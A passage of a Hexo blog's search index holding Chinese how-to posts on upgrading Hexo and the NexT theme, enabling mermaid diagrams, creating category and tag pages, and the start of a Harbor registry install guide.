class=\"string\">https://github.com/xxx/xxx.github.io</span></span><br><span class=\"line\">    <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">    <span class=\"attr\">repository:</span> <span class=\"string\">root@ecs.com:/root/blog.git</span></span><br><span class=\"line\">    <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n\n<p>完成以上工作后，我们运行<code>hexo d</code>时将触发上述2个服务，远端ECS服务器在接受到git推送信息后，触发post-receive钩子并更新<code>/var/root</code>目录下的静态页面。<br>其实，Github的用户主页更新服务也是同样的原理。</p>\n<h2 id=\"五、常见问题\"><a href=\"#五、常见问题\" class=\"headerlink\" title=\"五、常见问题\"></a>五、常见问题</h2><h3 id=\"1-首页的“节选”功能失效\"><a href=\"#1-首页的“节选”功能失效\" class=\"headerlink\" title=\"1. 首页的“节选”功能失效\"></a>1. 首页的“节选”功能失效</h3><p>原来是通过next配置文件的<code>excerpt_description: true</code>，但next新版本剔除了这个功能，而是由<code>hexo-auto-concerpt</code>插件实现此功能。<br>解决方案：安装<code>npm install hexo-auto-concerpt</code>，或者修改<code>package.json</code>后自动安装。</p>\n<h3 id=\"2-NodeJS为什么要选择版本12\"><a href=\"#2-NodeJS为什么要选择版本12\" class=\"headerlink\" title=\"2. NodeJS为什么要选择版本12\"></a>2. NodeJS为什么要选择版本12</h3><p>NodeJS 从 12.0.0 才开始支持函数 String.matchAll()，如果 NodeJS 的版本低于 12.0.0，那么执行 Hexo 的构建命令就会出现错误<br>解决方案：v12是node的最佳版本</p>\n<h3 id=\"3-external-link配置方法有变化\"><a href=\"#3-external-link配置方法有变化\" class=\"headerlink\" title=\"3. external_link配置方法有变化\"></a>3. <code>external_link</code>配置方法有变化</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deprecated</span></span><br><span class=\"line\"><span class=\"attr\">external_link:</span> <span class=\"literal\">true</span><span class=\"string\">|false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># New option</span></span><br><span class=\"line\"><span class=\"attr\">external_link:</span></span><br><span class=\"line\">  <span class=\"attr\">enable:</span> <span class=\"literal\">true</span> <span class=\"comment\"># Open external links in new tab</span></span><br><span class=\"line\">  <span class=\"attr\">field:</span> <span class=\"string\">site</span> <span class=\"comment\"># Apply to the whole site</span></span><br><span class=\"line\">  <span class=\"attr\">exclude:</span> <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-Next更新后，头部菜单或尾部Page按钮出现乱码\"><a href=\"#4-Next更新后，头部菜单或尾部Page按钮出现乱码\" class=\"headerlink\" title=\"4. Next更新后，头部菜单或尾部Page按钮出现乱码\"></a>4. Next更新后，头部菜单或尾部Page按钮出现乱码</h3><p>凡涉及到引用 Font Awesome 的地方，图标名和调用方式要更新，比如旧版填写 home，新版要改为 fa fa-home，否则图标会显示乱码</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 旧版</span></span><br><span class=\"line\"><span class=\"attr\">menu:</span></span><br><span class=\"line\"><span class=\"attr\">home:</span> <span class=\"string\">/</span> <span class=\"string\">||</span> <span class=\"string\">home</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 新版</span></span><br><span class=\"line\"><span class=\"attr\">menu:</span></span><br><span class=\"line\"><span class=\"attr\">home:</span> <span class=\"string\">/</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-home</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-LocalSearch-失效的问题\"><a href=\"#5-LocalSearch-失效的问题\" class=\"headerlink\" title=\"5. LocalSearch 失效的问题\"></a>5. LocalSearch 失效的问题</h3><p>开始你的Blog搜索功能还是正常的，搜索出结果一直在转圈圈等待，或者 搜索功能能搜索但是不能跳转过去，随着添加了几篇文章以后，搜索就不正常了，访问你的博客 http:&#x2F;&#x2F;你的博客域名&#x2F;search.xml&#96; 的时候，提示有存在不可解析的字节的错误，大致如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">This page contains the following errors:error on line 66 at column 35: Input is not proper UTF-8, indicate encoding !</span><br><span class=\"line\">Bytes: 0x08 0xE8 0xAF 0x84Below is a rendering of the page up to the first error.</span><br></pre></td></tr></table></figure>\n\n<p>此时，是因为你的xml解析有问题，换成json来解析即可，<br>解决方案：编辑你的站点配置文件<code>_config.yml</code>,找到搜索的地方 把 Search的xml解析改成json解析</p>\n<h3 id=\"6-highlight-js的版本9存在安全漏洞，频繁出现告警信息\"><a href=\"#6-highlight-js的版本9存在安全漏洞，频繁出现告警信息\" class=\"headerlink\" title=\"6. highlight.js的版本9存在安全漏洞，频繁出现告警信息\"></a>6. highlight.js的版本9存在安全漏洞，频繁出现告警信息</h3><p>全部完成<code>npm-check</code>和<code>npm-upgade</code>之后，问题完美解决。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://theme-next.js.org/docs/getting-started/upgrade.html\">NexT Compatibility with Hexo Version</a></li>\n<li><a href=\"https://www.imczw.com/post/tech/hexo5-next8-updated.html\">Hexo-5.x 与 NexT-8.x 跨版本升级</a></li>\n<li><a href=\"https://www.techgrow.cn/posts/d1f06120.html\">Hexo 与 Next 版本升级教程</a></li>\n<li><a href=\"https://www.jianshu.com/p/ccb61a511f9a\">Hexo NexT 主题的简易使用</a></li>\n<li><a href=\"https://www.yousazoe.top/archives/c12c9c40.html\">Hexo-NexT 博客使用插件总结</a></li>\n<li><a href=\"https://developer.aliyun.com/article/775005\">记录Hexo部署到阿里云服务器全过程</a></li>\n</ul>\n"},{"title":"HEXO 6.3 & NEXT 8.18.2 版本升级记录","url":"/2023/10/18/HEXO-6-3-NEXT-8-18-2-%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E8%AE%B0%E5%BD%95/","content":"<p>原本 HEXO v5.4.2 基于 node v12 版本，但最近个别组件出现安全告警要求强制升级，但新版本的组件依赖 node v14 版本，只好再次升级。<br><img src=\"/2023/10/18/HEXO-6-3-NEXT-8-18-2-%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E8%AE%B0%E5%BD%95/version.jpg\" alt=\"version\"></p>\n<p>其中一个开发设备是古老的 Mac 一体机，通过 node 官网下载 v18 的 pkg 安装包，运行异常退出，核查原因是操作系统版本是 High Sierra 10.13（最后一个支持32位App的版本，告别了僵尸大战！），被迫升级到 Catalina 10.15，经过好几番折腾，最后完成情况如下：</p>\n<p>node：最新版本 v20，LTS 版本 v18<br>npm：9.8.1<br>Hexo：6.3<br>Next：8.18.2</p>\n<h2 id=\"package-json-配置信息\"><a href=\"#package-json-配置信息\" class=\"headerlink\" title=\"package.json 配置信息\"></a>package.json 配置信息</h2><p>删除依赖库目录 <code>node_modules/</code> ，修改安装配置文件，然后重新<code>npm install</code></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;name&quot;:</span> <span class=\"string\">&quot;hexo-site&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;:</span> <span class=\"string\">&quot;0.0.0&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;private&quot;:</span> <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;scripts&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;build&quot;:</span> <span class=\"string\">&quot;hexo generate&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;clean&quot;:</span> <span class=\"string\">&quot;hexo clean&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;deploy&quot;:</span> <span class=\"string\">&quot;hexo deploy&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;server&quot;:</span> <span class=\"string\">&quot;hexo server&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">&quot;hexo&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;version&quot;:</span> <span class=\"string\">&quot;6.3.0&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">&quot;dependencies&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;@next-theme/plugins&quot;</span><span class=\"string\">:</span> <span class=\"string\">&quot;^8.18.2&quot;</span>,           <span class=\"comment\"># Next主题的对应插件</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo&quot;:</span> <span class=\"string\">&quot;^6.3.0&quot;</span>,                           <span class=\"comment\"># 主服务</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-auto-excerpt&quot;:</span> <span class=\"string\">&quot;^1.1.0&quot;</span>,              <span class=\"comment\"># 首页显示文章摘要，而非全文</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-deployer-git&quot;:</span> <span class=\"string\">&quot;^4.0.0&quot;</span>,              <span class=\"comment\"># git 远程发布</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-filter-mermaid-diagrams&quot;:</span> <span class=\"string\">&quot;^1.0.5&quot;</span>,   <span class=\"comment\"># mermaid 流程图的插件</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-archive&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,         <span class=\"comment\"># 生成归档信息</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-category&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,        <span class=\"comment\"># 生成分类信息</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-index&quot;:</span> <span class=\"string\">&quot;^3.0.0&quot;</span>,           <span class=\"comment\"># 生成目录信息</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-searchdb&quot;:</span> <span class=\"string\">&quot;^1.4.1&quot;</span>,        <span class=\"comment\"># 生成本地搜索数据库</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-tag&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,             <span class=\"comment\"># 生成标记信息</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-ejs&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,              <span class=\"comment\"># EJS 渲染引擎，支持 v3 版本</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-marked&quot;:</span> <span class=\"string\">&quot;^6.1.1&quot;</span>,           <span class=\"comment\"># Markdown 渲染引擎</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-stylus&quot;:</span> <span class=\"string\">&quot;^3.0.0&quot;</span>,           <span class=\"comment\"># Stylus CSS 解析引擎</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-server&quot;:</span> <span class=\"string\">&quot;^3.0.0&quot;</span>,                    <span class=\"comment\"># 本地 Web 服务器</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-theme-next&quot;:</span> <span class=\"string\">&quot;^8.18.2&quot;</span>,               <span class=\"comment\"># Next 主题</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-word-counter&quot;:</span> <span class=\"string\">&quot;0.1.0&quot;</span>                <span class=\"comment\"># 字数统计的插件</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"config-yml-配置信息\"><a href=\"#config-yml-配置信息\" class=\"headerlink\" title=\"_config.yml 配置信息\"></a>_config.yml 配置信息</h2><p>注意需修改 hexo 的主配置文件！然后，根据需要相应调整 Next 的配置文件。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">post_asset_folder:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">marked:</span></span><br><span class=\"line\">  <span class=\"attr\">prependRoot:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">postAsset:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">dompurify:</span> <span class=\"literal\">false</span>  <span class=\"comment\"># 默认启用HTML标签净化，将导致markdown代码渲染失败</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"更新说明\"><a href=\"#更新说明\" class=\"headerlink\" title=\"更新说明\"></a>更新说明</h2><p>出于 HTML 安全考虑，新版本的<a href=\"https://github.com/hexojs/hexo-renderer-marked\">hexo-renderer-marked</a> 嵌入了<a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a>，但经常造成渲染异常，已建议采用新的插件 <a href=\"https://github.com/hexojs/hexo-renderer-markdown-it/\">hexo-renderer-markdown-it</a>。</p>\n<p><a href=\"https://github.com/ashisherc/hexo-auto-excerpt\">hexo-auto-excerpt</a>插件通常用于显示文章摘要，已改为独立安装插件，而非进行配置；但由于 HTML 难以准确截断，推荐采用<code>&lt;!-- more --&gt;</code>标签在文章内部进行显式截断。<br>注意！默认版本 1.1.0 正常，但强制升级到最新 1.1.2 可能造成首页渲染错位</p>\n<p>Hexo 默认安装了 hexo-renderer-marked 和 hexo-renderer-ejs，因此你不仅可以用 Markdown 写作，你还可以用 EJS 写作。如果你安装了 hexo-renderer-pug，你甚至可以用 Pug 模板语言书写文章。只需要将文章的扩展名从 md 改成 ejs。</p>\n<p>早期 Next 主题的版本库位于：<a href=\"https://github.com/theme-next/hexo-theme-next\">theme-next&#x2F;hexo-theme-next</a>，由于开发团队的内部矛盾而长期无法更新…于是部分开发者又搞了一个新版本：<a href=\"https://github.com/next-theme/hexo-theme-next\">next-theme&#x2F;hexo-theme-next</a>，这就是 5.x 版本升级到 8.x 版本的重大变换，主要改造点：</p>\n<ul>\n<li>将配置文件移动到最外层，使用<code>_config.next.yml</code>，目的是后续的主题更新只需<code>git pull</code>，不需要担心配置文件冲突或者丢失的问题</li>\n<li>把库文件独立出来：<a href=\"https://github.com/next-theme/plugins\">@next-theme&#x2F;plugins</a>；该插件需要独立安装，且版本号务必相同</li>\n<li>模板格式从 swig 调整为 njk</li>\n<li>保留 git 安装方式，但也可以支持 npm</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.imczw.com/post/tech/hexo5-next8-updated.html\">Hexo-5.x 与 NexT-8.x 跨版本升级</a></li>\n<li><a href=\"https://bugwz.com/2019/09/17/hexo-markdown-renderer/\">Hexo的多种Markdown渲染器对比分析</a></li>\n</ul>\n"},{"title":"HEXO的Next主题引入mermaid流程图插件","url":"/2022/04/10/HEXO%E7%9A%84Next%E4%B8%BB%E9%A2%98%E5%BC%95%E5%85%A5mermaid%E6%B5%81%E7%A8%8B%E5%9B%BE%E6%8F%92%E4%BB%B6/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Mermaid(美人鱼)是一种基于Javascript的绘图工具，使用类似于Markdown的语法，使用户可以方便快捷地通过代码创建图表。<br>项目地址：<a href=\"https://github.com/mermaid-js/mermaid\">https://github.com/mermaid-js/mermaid</a></p>\n<p>Mermaid支持以下类型的图形：</p>\n<ul>\n<li>流程图：使用<code>graph</code>关键字，具体用法后文将详细介绍</li>\n<li>饼状图：使用<code>pie</code>关键字，具体用法后文将详细介绍</li>\n<li>序列图：使用<code>sequenceDiagram</code>关键字</li>\n<li>甘特图：使用<code>gantt</code>关键字</li>\n<li>类图：使用<code>classDiagram</code>关键字</li>\n<li>状态图：使用<code>stateDiagram</code>关键字</li>\n<li>用户旅程图：使用<code>journey</code>关键字</li>\n</ul>\n<h2 id=\"二、HEXO如何引入mermaid插件\"><a href=\"#二、HEXO如何引入mermaid插件\" class=\"headerlink\" title=\"二、HEXO如何引入mermaid插件\"></a>二、HEXO如何引入mermaid插件</h2><p>对于<code>hexo-theme-next</code>主题插件，从<code>8.11.0</code>版本开始内置mermaid支持，不再需要手工安装js模版文件了，具体步骤为：</p>\n<ol>\n<li><p>确认<code>hexo-theme-next</code>的版本号高于<code>8.11.0</code></p>\n</li>\n<li><p>确认已安装<code>hexo-filter-mermaid-diagrams</code>，当前版本号是<code>1.0.5</code>；如果没有安装，则：</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-filter-mermaid-diagrams</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>找到位于HEXO根目录的<code>_config.next.yml</code>，寻找<code>mermaid</code>段落并设置开关<code>enable: true</code></p>\n <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Mermaid tag</span></span><br><span class=\"line\"><span class=\"attr\">mermaid:</span></span><br><span class=\"line\">  <span class=\"attr\">enable:</span> <span class=\"literal\">false</span> <span class=\"comment\"># 此处修改为true！！！</span></span><br><span class=\"line\">  <span class=\"comment\"># Available themes: default | dark | forest | neutral</span></span><br><span class=\"line\">  <span class=\"attr\">theme:</span></span><br><span class=\"line\">    <span class=\"attr\">light:</span> <span class=\"string\">default</span></span><br><span class=\"line\">    <span class=\"attr\">dark:</span> <span class=\"string\">dark</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此时应该可以在文档中编写并展现流程图了。<br>如果不能正常展示，可能需要重新生成js文件，输入命令:</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm clean &amp;&amp; npm generate &amp;&amp; npm server</span><br></pre></td></tr></table></figure></li>\n</ol>\n<blockquote>\n<p>其实，vscode也可以引入mermaid，其插件名称是<code>Markdown-preview-enhanced</code></p>\n</blockquote>\n<h2 id=\"三、常用图形示例\"><a href=\"#三、常用图形示例\" class=\"headerlink\" title=\"三、常用图形示例\"></a>三、常用图形示例</h2><p>使用时需要在代码块声明中标注<strong>mermaid</strong>，然后内容体中表明图形类型，再逐一描述各个节点信息。<br><img src=\"/2022/04/10/HEXO%E7%9A%84Next%E4%B8%BB%E9%A2%98%E5%BC%95%E5%85%A5mermaid%E6%B5%81%E7%A8%8B%E5%9B%BE%E6%8F%92%E4%BB%B6/code.png\" alt=\"代码块示例\"></p>\n<h3 id=\"1-流程图（graph关键字）\"><a href=\"#1-流程图（graph关键字）\" class=\"headerlink\" title=\"1. 流程图（graph关键字）\"></a>1. 流程图（graph关键字）</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">graph TD</span><br><span class=\"line\">  A[Christmas] --&gt;|Get money| B(Go shopping)</span><br><span class=\"line\">  B --&gt; C&#123;Let me think&#125;</span><br><span class=\"line\">  C --&gt;|One| D[Laptop]</span><br><span class=\"line\">  C --&gt;|Two| E[iPhone]</span><br><span class=\"line\">  C --&gt;|Three| F[fa:fa-car Car]</span><br></pre></td></tr></table></figure>\n\n<pre class=\"mermaid\">graph TD\n  A[Christmas] -->|Get money| B(Go shopping)\n  B --> C{Let me think}\n  C -->|One| D[Laptop]\n  C -->|Two| E[iPhone]\n  C -->|Three| F[fa:fa-car Car]</pre>\n\n<h3 id=\"2-饼图（pie关键字）\"><a href=\"#2-饼图（pie关键字）\" class=\"headerlink\" title=\"2. 饼图（pie关键字）\"></a>2. 饼图（pie关键字）</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">pie</span><br><span class=\"line\">  title 为什么总是宅在家里？</span><br><span class=\"line\">  &quot;喜欢宅&quot; : 15</span><br><span class=\"line\">  &quot;天气太热或太冷&quot; : 20</span><br><span class=\"line\">  &quot;穷&quot; : 500</span><br></pre></td></tr></table></figure>\n\n<pre class=\"mermaid\">pie\n  title 为什么总是宅在家里？\n  \"喜欢宅\" : 15\n  \"天气太热或太冷\" : 20\n  \"穷\" : 500</pre>\n\n<blockquote>\n<p>饼图最多支持9种不同的颜色</p>\n</blockquote>\n<h3 id=\"3-时序图（sequenceDiagram关键字）\"><a href=\"#3-时序图（sequenceDiagram关键字）\" class=\"headerlink\" title=\"3. 时序图（sequenceDiagram关键字）\"></a>3. 时序图（sequenceDiagram关键字）</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">sequenceDiagram</span><br><span class=\"line\">  Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class=\"line\">  loop Healthcheck</span><br><span class=\"line\">      John-&gt;&gt;John: Fight against hypochondria</span><br><span class=\"line\">  end</span><br><span class=\"line\">  Note right of John: Rational thoughts!</span><br><span class=\"line\">  John--&gt;&gt;Alice: Great!</span><br><span class=\"line\">  John-&gt;&gt;Bob: How about you?</span><br><span class=\"line\">  Bob--&gt;&gt;John: Jolly good!</span><br></pre></td></tr></table></figure>\n\n<pre class=\"mermaid\">sequenceDiagram\n  Alice->>John: Hello John, how are you?\n  loop Healthcheck\n      John->>John: Fight against hypochondria\n  end\n  Note right of John: Rational thoughts!\n  John-->>Alice: Great!\n  John->>Bob: How about you?\n  Bob-->>John: Jolly good!</pre>\n\n<h3 id=\"4-甘特图（gantt关键字）\"><a href=\"#4-甘特图（gantt关键字）\" class=\"headerlink\" title=\"4. 甘特图（gantt关键字）\"></a>4. 甘特图（gantt关键字）</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">gantt</span><br><span class=\"line\">section Section</span><br><span class=\"line\">  Completed :done, des1, 2014-01-06,2014-01-08</span><br><span class=\"line\">  Active       : active, des2, 2014-01-07, 3d</span><br><span class=\"line\">  Parallel 1   : des3, after des1, 1d</span><br><span class=\"line\">  Parallel 2   : des4, after des1, 1d</span><br><span class=\"line\">  Parallel 3   : des5, after des3, 1d</span><br><span class=\"line\">  Parallel 4   : des6, after des4, 1d</span><br></pre></td></tr></table></figure>\n\n<pre class=\"mermaid\">gantt\nsection Section\n  Completed :done, des1, 2014-01-06,2014-01-08\n  Active       : active, des2, 2014-01-07, 3d\n  Parallel 1   : des3, after des1, 1d\n  Parallel 2   : des4, after des1, 1d\n  Parallel 3   : des5, after des3, 1d\n  Parallel 4   : des6, after des4, 1d</pre>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://github.com/mermaid-js/mermaid\">mermaid 官方源码</a></li>\n<li><a href=\"https://github.com/webappdevelp/hexo-filter-mermaid-diagrams\">hexo-filter-mermaid-diagrams 的官方源码</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/355997933\">重点推荐！Mermaid从入门到入土——Markdown进阶语法</a></li>\n<li><a href=\"https://juejin.cn/post/7030074642559664135\">利用 Markdown 语法画 mermaid 流程图</a></li>\n</ul>\n"},{"title":"HEXO设置About, Categories, Tags页面的方法","url":"/2018/12/24/HEXO%E8%AE%BE%E7%BD%AEAbout-Categories-Tags%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<h2 id=\"添加关于页面\"><a href=\"#添加关于页面\" class=\"headerlink\" title=\"添加关于页面\"></a>添加<code>关于</code>页面</h2><ul>\n<li>运行hexo新建一个名为<code>about</code>的页面</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new page <span class=\"string\">&quot;about&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>找到<code>source/about/index.md</code>文件，自由编辑并存盘</li>\n</ul>\n<h2 id=\"添加分类页面\"><a href=\"#添加分类页面\" class=\"headerlink\" title=\"添加分类页面\"></a>添加<code>分类</code>页面</h2><ul>\n<li>打开<strong>项目配置文件</strong>，设置所有分类的属性和目录名</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/_config.yml</span><br><span class=\"line\"></span><br><span class=\"line\">default_category: uncategorized</span><br><span class=\"line\">category_map:</span><br><span class=\"line\">\t编程: programming</span><br><span class=\"line\">\t生活: life</span><br><span class=\"line\">\t其他: other</span><br><span class=\"line\">tag_map:</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>运行hexo新建一个名为<code>caterogies</code>的页面</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new page <span class=\"string\">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>找到<code>source/caterogies/index.md</code>文件，确认<code>type</code>的设置信息</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/source/caterogies/index.md</span><br><span class=\"line\">---</span><br><span class=\"line\">title: 分类</span><br><span class=\"line\">date: 2014-12-22 12:39:04</span><br><span class=\"line\">type: &quot;categories&quot;</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"添加标签页面\"><a href=\"#添加标签页面\" class=\"headerlink\" title=\"添加标签页面\"></a>添加<code>标签</code>页面</h3><ul>\n<li>运行hexo新建一个名为<code>tags</code>的页面</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new page <span class=\"string\">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>找到<code>source/tags/index.md</code>文件，确认<code>type</code>的设置信息</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/source/tags/index.md</span><br><span class=\"line\">---</span><br><span class=\"line\">title: 分类</span><br><span class=\"line\">date: 2014-12-22 12:39:04</span><br><span class=\"line\">type: &quot;tags&quot;</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置menu的入口\"><a href=\"#设置menu的入口\" class=\"headerlink\" title=\"设置menu的入口\"></a>设置<code>menu</code>的入口</h3><ul>\n<li>设置<strong>主题配置文件</strong>的 menu\b信息</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/themes/next/_config.yml</span><br><span class=\"line\">menu:</span><br><span class=\"line\">  home: /                       //主页，默认</span><br><span class=\"line\">  categories: /categories       //分类，自定义</span><br><span class=\"line\">  archives: /archives           //归档，默认</span><br><span class=\"line\">  tags: /tags                   //标签，自定义</span><br><span class=\"line\">  about: /about                 //关于，自定义           </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"如何使用标签和分类信息\"><a href=\"#如何使用标签和分类信息\" class=\"headerlink\" title=\"如何使用标签和分类信息\"></a>如何使用<code>标签</code>和<code>分类</code>信息</h3><ul>\n<li>在个人md文件的注释信息中，可以添加<strong>catagories</strong>和<strong>tags</strong>信息</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ~/source/_posts/hello-world.md</span><br><span class=\"line\">---</span><br><span class=\"line\">title: hello-world</span><br><span class=\"line\">categories:</span><br><span class=\"line\">    - 生活                        （这个就是文章的分类了）</span><br><span class=\"line\">tags:</span><br><span class=\"line\">    - 生活                       </span><br><span class=\"line\">    - 有病                        （这个就是文章的标签了）</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>如果用户md文件设置了分类和标签的注释信息，hexo在生成页面时将自动进行索引</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo s</span><br><span class=\"line\">$ hexo d -g</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>打开blog主页，顶层菜单出现了<strong>About</strong>、<strong>Catagories</strong>和<strong>Tags</strong>的入口，点击进去就可以使用了</li>\n</ul>\n<p><strong>tags的页面效果</strong></p>\n<img src=\"/2018/12/24/HEXO%E8%AE%BE%E7%BD%AEAbout-Categories-Tags%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95/tags.png\" class=\"\" title=\"这是tags的图片说明\">\n\n<p><strong>categories的页面效果</strong></p>\n<img src=\"/2018/12/24/HEXO%E8%AE%BE%E7%BD%AEAbout-Categories-Tags%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95/categories.png\" class=\"\" title=\"这是categories的图片说明\">\n","categories":["编程"],"tags":["hexo","操作手册"]},{"title":"Harbor的安装记录","url":"/2020/07/12/Harbor%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"系统规划\"><a href=\"#系统规划\" class=\"headerlink\" title=\"系统规划\"></a>系统规划</h2><p>镜像仓库作为Kubernets集群的重要基础设施，必须考虑在内网的互联网隔离问题。<br>Docker虽然自带了Registry，但是不能提供细粒度的权限设置，此外，在大型集群中为了解决镜像拉取的性能瓶颈，经常需要解决多级镜像的同步问题，因此Harbor已经成为事实标准，为此本文研究了如何在内网离线安装Harbor。</p>\n<p>基线版本的信息如下：</p>\n<pre><code>- Centos=7.8\n- Docker-CE=19.03.12\n- Docker-compose=1.21.2\n- Harbor=v1.10.3 \n</code></pre>\n<p>Harbor目前采用http方式，Admin URL：<a href=\"http://192.168.0.130:7350/\">http://192.168.0.130:7350</a><br>Harbor用户数据的存放目录：<code>/data/harbor</code>。为避免重装系统造成数据丢失，采用一个独立硬盘mount到&#x2F;data。</p>\n<h2 id=\"Harbor-Server的安装步骤\"><a href=\"#Harbor-Server的安装步骤\" class=\"headerlink\" title=\"Harbor Server的安装步骤\"></a>Harbor Server的安装步骤</h2><ol>\n<li><p>安装docker-ce、docker-compose</p>\n<p> 